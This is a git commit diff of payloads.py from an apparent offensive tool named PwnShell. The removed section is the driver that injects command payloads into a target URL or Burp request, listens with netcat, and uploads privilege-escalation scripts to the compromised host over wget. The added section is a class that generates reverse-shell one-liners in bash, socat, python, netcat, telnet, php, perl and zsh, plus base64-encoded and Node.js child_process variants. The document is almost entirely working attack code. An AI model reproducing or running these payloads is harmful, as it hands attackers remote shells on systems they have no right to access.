3691e92c8ff594e40d3409de10262b9e40adba57
zAbuQasem <74984708+zAbuQasem@users.noreply.github.com>
2021-05-23 18:12:20 +0000

    Update payloads.py

--- payloads.py
+++ payloads.py
@@ -1,316 +1,65 @@
-#!/usr/bin/env python3
-# coding=utf-8
-import sys
 import base64
-import netifaces
 import os
-import argparse
-import nclib
-from threading import Thread
-import ipaddress
-import urllib3
-import requests
-from http.server import HTTPServer, CGIHTTPRequestHandler
-import socketserver
-import urllib.parse
-from payloads import PayLoads
-import time
-import socket
-import burpee
-from colors import Colors , ColorsSet
 
+class PayLoads:
 
-class PwnShell:
-	def __init__(self, args):
-		urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-		self.ip = ip_address
-		self.ip = args.host
-		self.port = args.port
-		self.domain = args.url
-		self.method = args.method
-		self.cookie = args.cookie
-		self.data = args.data
-		self.type = args.type
-		self.file = args.file
-		self.nodejs = args.nodejs
-		self.url=None
-		self.iteration=0
-		self.listt=[]
-		self.encoded_payload=None
-		self.connected = False
+    def __init__(self, ip, port, node=False):
+        self.ip = ip
+        self.port = port
+        self.use_node = node
 
-		if not self.file and not self.domain:
-			print(colors.get_colored_text("[!]Please use Provide a URL or a REQUEST file[!]\n\n"+"[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
-			exit()
-		########################################################################
-		###################### Specifying OS ###################################
-		if self.type == "linux" or self.type == "l":
-			self.shell_linux()
-		elif self.type == "windows" or self.type == "w":
-			self.shell_windows()
-		else:
-			print(colors.get_colored_text("[!]Invalid Value -> " + self.type +"\n\n[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
-			exit_gracefully()
-		######################################################################
+    def nodejs(self, payloads):
+        node_payloads = []
+        for ini_payload in payloads:
+            nodejs_payload = f'''require('child_process').exec("{ini_payload}")'''
+            node_payloads.append(nodejs_payload)
+        return node_payloads
 
-	def info(self):
-		self.payload_iter()
-		info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request File':self.file, '[*]Use NodeJS Payloads':self.nodejs}
-		for key, value in info.items():
-			if value:
-				print(colors.get_colored_text(f"{key} : ", ColorsSet.ORANGE),end='')
-				print(colors.get_colored_text(f"{value}", ColorsSet.SILVER))
-		print("\n")
-	####################################################################################
-	###################################  LINUX #########################################
+    def base64_payloads(self, payloads):
+        base64_payloads = []
+        for payload in payloads:
+            cli = payload.encode("utf-8")
+            encoded = base64.b64encode(cli).decode('utf-8')
+            base64_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
+            base64_payloads.append(base64_payload)
+        return base64_payloads
 
-	def shell_linux(self):  # Default option
-		self.info()
-		self.is_valid()
-		self.thread()  # leave it the last one
+    def payloads(self):
+        ip = self.ip
+        port = self.port
+        # BASH payloads
+        BASH196 = f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
+        BASH_DEV = f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
+        BASH_READLINE = f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
+        BASH5 = f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''
 
-	#########################################################################################
-	###################################  WINDOWS #########################################
+        # socat payloads
+        SOCAT = f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''
 
-	def shell_windows(self):
-		print("			  ##NOT ADDED YET !!")
-		exit_gracefully()
+        # python payloads
+        PYTHON2 = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
+        PYTHON3 = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
 
-	######################################################################################
-	##########################  CHECK IF IP & PORT IS VALID ############################
+        # BSD payloads
+        BSD = f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''
+        BSD2= f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
 
-	def is_valid(self):  # Checking if the ip address is valid
-		try:
-			ipaddress.ip_address(self.ip)
-			if self.port <= 65535:
-				return True
-			else:
-				print("[!]Invalid PORT NUMBER -> %d" % self.port)
-				exit_gracefully()
-		except ValueError:
-			print("\n[!]Invalid IP : %d" % self.ip)
-			exit_gracefully()
+        # telnet payloads
+        TELNET = f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''
 
-	#########################################################################################
-	##############################  NC LISTNER + STAGER ###################################
+        # php payloads
+        EXEC1 = f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
+        SHELL_EXEC = f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
+        SYSTEM = f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
+        WEIRD_QOUTE = f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''
+        # perl payloads
+        PERL = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))''' + '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
+        PERL_NO_SH = f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''
 
-	def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
-		nc = nclib.Netcat(listen=('', self.port))
-		print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
-		self.connected = True  #To stop the thread
-		self.for_listener()
-		nc.send_line(b"export TERM=xterm-256color")
-		print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
-		send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
-		nc.send_line(send.encode("utf-8"))
-		send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm/ ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null ; clear'''
-		nc.send_line(send.encode("utf-8"))
-		print('[*]Activating a TTY Shell Using --> [Python3]')
-		nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
-		nc.interact()
-		nc.close()
-
-	def for_listener(self):
-		print("[*]CONNECTION ESTABLISHED!")
-		if self.method == "get" or self.method == "GET":
-			print("[+]Vulnerable URL:",self.url)
-		else:
-			print(f"[+]Payload: {self.encoded_payload}")
-		print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
-		print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
-		print('[*]Cloning PrivESC Scripts From Their Repositories...')
-		#os.system('curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
-		time.sleep(4)
-
-
-
-	#########################################################################################
-	###################################  HTTP SERVER #########################################
-
-	def http_server(self):
-		# Make sure the server is created at current directory
-		os.chdir('.')
-		# Create server object listening the port 9002
-		server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
-		# Start the web server
-		server_object.serve_forever()
-
-	#########################################################################################
-	###################################  THREADS ############################################
-
-	def thread(self):
-		listen = Thread(target=self.listener)
-		sendpayload = Thread(target=self.send_payload)
-		httpserver = Thread(target=self.http_server)
-		if self.file:
-			burp = Thread(target=self.parse_file)
-			burp.daemon = True
-			burp.start()
-		listen.daemon = True
-		sendpayload.daemon = True
-		httpserver.daemon = True
-		listen.start()
-		sendpayload.start()
-		httpserver.start()
-		httpserver.join()
-		listen.join()
-		sendpayload.join()
-		if self.file:
-			burp.join()
-
-	############################################################################################
-	################################ Check If we got connection ################################
-	def is_port_in_use(self):
-		output = os.popen('netstat -lant').read()
-		lines = output.split('\n')
-		for line in lines:
-			if str(self.port) in line:
-				if line.split()[-1] == 'ESTABLISHED':
-					return True
-		return False
-	############################################################################################
-	###################################  SENDING THE PAYLOADS #################################
-	def send_payload(self):
-		
-		if not self.file:
-			payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
-			print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
-			for payload in payloads:
-				if self.connected:
-					return
-				self.encoded_payload = self.get_url_encoded_payload(payload)
-				self.iteration += 1
-				print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
-				time.sleep(2)
-				if self.is_port_in_use():
-					break
-				self.send_request()
-
-	###############################################################################################
-	###################################  Send The Request #########################################
-	def send_request(self):
-		if self.domain:
-			self.url = self.domain.replace('PWNME',self.encoded_payload)
-			proxies = {'http': 'http://127.0.0.1:8080'}
-			headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
-			if self.cookie:
-				cookies = self.cookie
-			else:
-				cookies = None
-			if self.method == 'post' or self.method == 'POST':
-				if self.data:
-					data_parsed = self.data.replace("PWNME", self.encoded_payload)  # Don't change
-					r = requests.post(self.url, headers=headers,cookies=cookies, verify=False)
-				else:
-					data_parsed = None
-					r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
-			else:
-				r = requests.get(self.url, cookies=cookies, verify=False)					
-
-	########################################################################################
-	###################################  PARSER BURPREQUEST #################################
-	def parse_file(self):
-		print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
-		payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
-		for payload in payloads:
-			if self.connected:
-				return
-			proxies = {'http': 'http://127.0.0.1:8080'}
-			self.encoded_payload = self.get_url_encoded_payload(payload)
-			self.iteration += 1
-			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
-			request, post_data = burpee.parse_request(self.file)  # Don't change
-			for r in request:
-				if request[r] == "PWNME":
-					request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD
-				if r == "Host":
-					self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
-			self.url = self.url.replace("PWNME", self.encoded_payload)
-
-			if self.method == "post" or self.method == "POST":
-				if post_data:
-					post_data = post_data.replace("PWNME", self.encoded_payload)
-					req = requests.post(self.url, headers=request, data=post_data, verify=False)
-					time.sleep(2)
-					if self.is_port_in_use():
-						break
-				else:
-					req = requests.post(self.url, headers=request, verify=False)
-					time.sleep(2)
-					if self.is_port_in_use():
-						break
-
-			else:
-				req = requests.get(self.url, headers=request,verify=False)
-				time.sleep(2)
-				if self.is_port_in_use():
-					break
-	######################################################################################
-	def payload_iter(self):
-		payloads = PayLoads(self.ip, self.port).payloads()
-		for payload in payloads:
-			self.listt.append(payload)
-
-	#########################################################################################
-	###################################  ENCODING PAYLOADS #################################
-
-	@staticmethod
-	def get_url_encoded_payload(payload):
-		encoded_payload = urllib.parse.quote(payload)
-		encoded_payload = encoded_payload.replace('/', '%2F')
-		return encoded_payload
-
-
-def exit_gracefully():
-	print("								   #GOOD BYE!")
-	exit()
-
-
-if __name__ == '__main__':
-	try:
-		banner = ''' 
-
- $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
- $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
- $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
- $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
- $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
- $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
- $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
- \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
- ########################################################################
- ------------------------------------                                                                                
- | Authors: [AbuQasem] & [AlBalouli] |                                              
- ------------------------------------                               
-\n    '''
-
-		
-		colors=Colors(ColorsSet.WHITE)
-		print(colors.get_colored_text(banner, ColorsSet.GREEN))
-		parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-		try:
-			ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
-			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
-		except:
-			ip_address = None
-			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
-		parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
-		parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
-		parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
-		parser.add_argument("-f", "--file", help='Request file')
-		parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
-		parser.add_argument("-d", "--data", help='Post data')
-		parser.add_argument("-c", "--cookie", help='Enter Cookie')
-		parser.add_argument("-k", "--header", help='Provide header')
-		parser.add_argument("-m", "--method", help='Request Method',default='POST')
-		args=parser.parse_args()
-		########################################################################
-		########################## Defining variables ##########################
-		pwnshell = PwnShell(args)
-		pwnshell.send_payload()
-	except KeyboardInterrupt:
-		exit_gracefully()
-
-# TODO
-#Work on windows
-#ADD pentest monkey payload
+        # zsh payloads
+        ZSH = f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
+        payloads = [value for name, value in locals().items() if name.isupper()]
+        base64_payloads = self.base64_payloads(payloads)
+        if self.use_node:
+            return self.nodejs(payloads + base64_payloads)
+        return payloads + base64_payloads
